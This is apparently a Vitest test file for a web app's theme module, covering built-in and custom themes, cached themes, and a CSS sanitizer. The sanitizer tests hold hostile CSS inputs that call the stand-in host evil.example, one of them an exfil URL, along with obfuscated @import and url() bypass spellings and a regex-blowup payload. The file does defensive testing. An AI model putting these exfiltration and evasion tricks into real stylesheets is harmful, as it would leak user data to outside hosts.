import { describe, expect, it, beforeEach } from "vitest";
import { applyCachedTheme, applyTheme, cacheActiveTheme, CUSTOM_STYLE_ID, sanitizeThemeCss } from "./applyTheme";
import { getEditorAppearance } from "./editorTheme";

beforeEach(() => {
  document.documentElement.removeAttribute("data-theme");
  document.getElementById(CUSTOM_STYLE_ID)?.remove();
  localStorage.clear();
});

describe("applyTheme", () => {
  it("sets data-theme=light for the built-in light theme", () => {
    applyTheme({ id: "light", appearance: "light", builtin: true });
    expect(document.documentElement.getAttribute("data-theme")).toBe("light");
    expect(document.getElementById(CUSTOM_STYLE_ID)).toBeNull();
    expect(getEditorAppearance()).toBe("light");
  });

  it("clears data-theme for the built-in dark theme", () => {
    applyTheme({ id: "light", appearance: "light", builtin: true });
    applyTheme({ id: "dark", appearance: "dark", builtin: true });
    expect(document.documentElement.getAttribute("data-theme")).toBeNull();
    expect(getEditorAppearance()).toBe("dark");
  });

  it("sets data-theme to the id for other built-in themes", () => {
    applyTheme({ id: "github-dark", appearance: "dark", builtin: true });
    expect(document.documentElement.getAttribute("data-theme")).toBe("github-dark");
    expect(getEditorAppearance()).toBe("dark");

    applyTheme({ id: "github-light", appearance: "light", builtin: true });
    expect(document.documentElement.getAttribute("data-theme")).toBe("github-light");
    expect(getEditorAppearance()).toBe("light");
  });

  it("injects custom CSS into a style element and clears data-theme", () => {
    applyTheme({ id: "light", appearance: "light", builtin: true });
    applyTheme({
      id: "solar",
      appearance: "dark",
      builtin: false,
      css: ":root { --color-bg-app: #112233; }",
    });

    const style = document.getElementById(CUSTOM_STYLE_ID);
    expect(style?.textContent).toContain("--color-bg-app: #112233");
    expect(document.documentElement.getAttribute("data-theme")).toBeNull();
  });

  it("replaces previously injected custom CSS", () => {
    applyTheme({ id: "a", appearance: "dark", builtin: false, css: ":root { --color-bg-app: #aaa; }" });
    applyTheme({ id: "b", appearance: "dark", builtin: false, css: ":root { --color-bg-app: #bbb; }" });

    const style = document.getElementById(CUSTOM_STYLE_ID);
    expect(style?.textContent).toContain("#bbb");
    expect(style?.textContent).not.toContain("#aaa");
  });

  it("strips @import and external url() from imported theme CSS before applying it", () => {
    const malicious = `:root { --color-bg-app: #000; } @import url("https://evil.example/x.css"); .x { background: url(https://evil.example/exfil?x=1); }`;
    applyTheme({ id: "custom", appearance: "dark", builtin: false, css: malicious });
    const applied = document.getElementById(CUSTOM_STYLE_ID)!.textContent!;
    expect(applied).not.toContain("@import");
    expect(applied).not.toContain("https://evil.example");
  });

  describe("cached theme", () => {
    it("applyCachedTheme is a no-op with nothing cached", () => {
      applyCachedTheme();
      expect(document.documentElement.getAttribute("data-theme")).toBeNull();
    });

    it("re-applies a cached built-in theme synchronously", () => {
      cacheActiveTheme({ id: "github-dark", appearance: "dark", builtin: true });
      applyCachedTheme();
      expect(document.documentElement.getAttribute("data-theme")).toBe("github-dark");
      expect(getEditorAppearance()).toBe("dark");
    });

    it("re-applies a cached custom theme's CSS", () => {
      cacheActiveTheme({
        id: "solar",
        appearance: "dark",
        builtin: false,
        css: ":root { --color-bg-app: #424242; }",
      });
      applyCachedTheme();
      expect(document.getElementById(CUSTOM_STYLE_ID)?.textContent).toContain("#424242");
    });

    it("ignores a malformed cache", () => {
      localStorage.setItem("activeTheme", "not json");
      expect(() => applyCachedTheme()).not.toThrow();
      expect(document.documentElement.getAttribute("data-theme")).toBeNull();
    });
  });
});

describe("sanitizeThemeCss", () => {
  it("strips a plain @import", () => {
    const out = sanitizeThemeCss('@import url("https://evil.example/x.css"); .x{color:red}');
    expect(out).not.toContain("@import");
    expect(out).not.toContain("evil.example");
    expect(out).toContain(".x{color:red}");
  });

  it("strips an @import using a bare string (no url())", () => {
    const out = sanitizeThemeCss(`@import "https://evil.example/x.css";`);
    expect(out).not.toContain("@import");
    expect(out).not.toContain("evil.example");
  });

  it("strips external url() regardless of quoting", () => {
    expect(sanitizeThemeCss("a{background:url(https://evil.example/x)}")).not.toContain(
      "evil.example",
    );
    expect(sanitizeThemeCss("a{background:url('https://evil.example/x')}")).not.toContain(
      "evil.example",
    );
    expect(sanitizeThemeCss('a{background:url("https://evil.example/x")}')).not.toContain(
      "evil.example",
    );
  });

  it("strips protocol-relative url()s", () => {
    const out = sanitizeThemeCss("a{background:url(//evil.example/x)}");
    expect(out).not.toContain("evil.example");
  });

  it("is case-insensitive for @import, URL, and the http(s) scheme", () => {
    expect(sanitizeThemeCss('@IMPORT url("https://evil.example/x.css");')).not.toContain(
      "evil.example",
    );
    expect(sanitizeThemeCss("a{background:URL(HTTPS://EVIL.EXAMPLE/x)}").toLowerCase()).not.toContain(
      "evil.example",
    );
    expect(sanitizeThemeCss("a{background:Url(Http://evil.example/x)}")).not.toContain(
      "evil.example",
    );
  });

  it("tolerates whitespace and newlines inside url(...)", () => {
    const out = sanitizeThemeCss("a{background:url(\n  https://evil.example/x  \n)}");
    expect(out).not.toContain("evil.example");
  });

  it("strips an @import/url split by a CSS comment mid-keyword", () => {
    const out1 = sanitizeThemeCss('@im/**/port url("https://evil.example/x.css");');
    expect(out1).not.toContain("evil.example");
    expect(out1.toLowerCase()).not.toContain("import");

    const out2 = sanitizeThemeCss("a{background:ur/**/l(https://evil.example/x)}");
    expect(out2).not.toContain("evil.example");
  });

  it("strips url() spelled with CSS unicode-escape characters", () => {
    // \75 is the CSS hex escape for the letter "u".
    const out = sanitizeThemeCss("a{background:\\75rl(https://evil.example/x)}");
    expect(out).not.toContain("evil.example");
  });

  it("strips @import spelled with CSS unicode-escape characters", () => {
    // \40 is "@", \69 is "i" — a maximally-obfuscated @import.
    const out = sanitizeThemeCss('\\40 \\69mport url("https://evil.example/x.css");');
    expect(out).not.toContain("evil.example");
  });

  it("leaves url(data:...) untouched", () => {
    const css = "a{background:url(data:image/png;base64,iVBORw0KGgoAAAANS//w==)}";
    expect(sanitizeThemeCss(css)).toBe(css);
  });

  it("leaves same-origin relative url()s untouched", () => {
    const css1 = "a{background:url(./foo.png)}";
    const css2 = "a{background:url('assets/bar.svg')}";
    const css3 = 'a{background:url("../icons/baz.png")}';
    expect(sanitizeThemeCss(css1)).toBe(css1);
    expect(sanitizeThemeCss(css2)).toBe(css2);
    expect(sanitizeThemeCss(css3)).toBe(css3);
  });

  it("leaves ordinary theme CSS entirely unchanged", () => {
    const css = `:root { --color-bg-app: #112233; --color-text-primary: #eee; }\n.foo\\:bar { color: red; }`;
    expect(sanitizeThemeCss(css)).toBe(css);
  });

  it("neutralizes a url() scheme hidden behind a CSS hex escape", () => {
    // \0068 is the CSS hex escape for the letter "h" — decodes to "https://...".
    const out = sanitizeThemeCss("a{background:url(\\0068ttps://evil.example/x)}");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("url()");
  });

  it("neutralizes a url() scheme hidden behind a CSS identity escape", () => {
    // \h is a CSS identity escape (h is not a hex digit) — decodes to the literal "h".
    const out = sanitizeThemeCss("a{background:url(\\https://evil.example/x)}");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("url()");
  });

  it("leaves an escaped selector outside any url()/@import span untouched", () => {
    const css = ".hover\\:bg-red { background: red; }";
    expect(sanitizeThemeCss(css)).toBe(css);
  });

  it("neutralizes a url() with an opening quote that never finds its close", () => {
    // No closing " anywhere after this point in the file — a naive lazy
    // regex backtracks into treating the quote as ordinary content and
    // leaves the real payload completely unexamined.
    const out = sanitizeThemeCss('a{background:url("https://evil.example/x)}');
    expect(out).not.toContain("evil.example");
    expect(out).toContain("url()");
  });

  it("still leaves an earlier well-formed relative url() untouched when a later one is unterminated", () => {
    const css = 'a{background:url("./relative.png")} b{background:url("https://evil.example/unterminated}';
    const out = sanitizeThemeCss(css);
    expect(out).toContain("./relative.png");
    expect(out).not.toContain("evil.example");
  });

  it("leaves a properly closed quoted relative url() untouched", () => {
    const css = 'a{background:url("./foo.png")}';
    expect(sanitizeThemeCss(css)).toBe(css);
  });

  it("neutralizes a url() whose unterminated string ends in a backslash-escaped quote", () => {
    // The trailing \" is an escaped quote, not a real closing quote — the
    // string (and thus the url() argument) never actually closes.
    const out = sanitizeThemeCss('a{background:url("https://evil.example/x\\"');
    expect(out).not.toContain("evil.example");
    expect(out).toContain("url()");
  });

  it("does not throw when a hex escape spells a codepoint outside the valid Unicode range", () => {
    expect(() => sanitizeThemeCss("a{background:url(\\FFFFFFhttps://evil.example/x)}")).not.toThrow();
  });

  it("does not throw when a hex escape spells a surrogate codepoint", () => {
    expect(() => sanitizeThemeCss("a{background:url(\\D800https://evil.example/x)}")).not.toThrow();
  });

  it("does not exhibit exponential-time behaviour on a long backslash run before an unterminated quote", () => {
    const payload = `a{background:url("${"\\\\".repeat(5000)}`;
    const start = performance.now();
    const out = sanitizeThemeCss(payload);
    const elapsed = performance.now() - start;
    expect(elapsed).toBeLessThan(200);
    expect(out).toContain("url()");
  });
});
